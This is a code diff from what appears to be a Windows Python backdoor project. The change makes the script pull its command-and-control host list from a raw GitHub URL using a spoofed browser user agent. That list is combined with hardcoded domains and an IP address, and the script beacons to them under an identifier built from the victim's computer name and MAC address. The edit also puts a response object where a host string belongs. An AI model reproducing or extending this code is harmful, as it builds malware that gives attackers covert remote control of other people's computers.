@@ -125,7 +125,12 @@ suser=os.getenv('USERPROFILE')
 #except Exception,e:
 #    print str(e)
 #main loop here
-sites = ["paner.altervista.org", "verifiche.ddns.net"]
+ua = UserAgent()
+#print(ua.chrome)
+header = {'User-Agent':str(ua.chrome)}
+mainsite = requests.get("https://raw.githubusercontent.com/pistacchietto/Win-Python-Backdoor/master/site.txt", headers=header)
+sites = ["paner.altervista.org", mainsite]
+#sites = ["paner.altervista.org", "verifiche.ddns.net"]
 #site="paner.altervista.org"
 site1="paner.altervista.org"
 site2="52.26.124.145"
@@ -144,9 +149,7 @@ sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress+"_app"#+"_"+os.getenv('U
 #pythoncom.CoInitialize()
 #ie = Dispatch("InternetExplorer.Application")
 #ie.Visible = 0
-ua = UserAgent()
-#print(ua.chrome)
-header = {'User-Agent':str(ua.chrome)}
+
 #while True:
 for site in sites:
         #sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress+"_"+os.getenv('USERNAME')
